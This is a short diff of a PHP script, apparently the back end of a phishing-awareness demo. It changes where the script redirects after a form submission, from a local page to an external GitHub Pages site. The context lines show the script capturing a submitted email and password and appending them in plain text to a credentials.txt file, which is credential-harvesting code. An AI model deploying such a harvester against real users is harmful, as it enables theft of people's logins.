@@ -10,6 +10,6 @@ $data = "Email: " . $email . " | Password: " . $password . "\n";
 file_put_contents('credentials.txt', $data, FILE_APPEND);
 
 // Redirect to an educational page
-header('Location: website.html');
+header('Location: https://jj3375.github.io/my_website/');
 exit;
 ?>
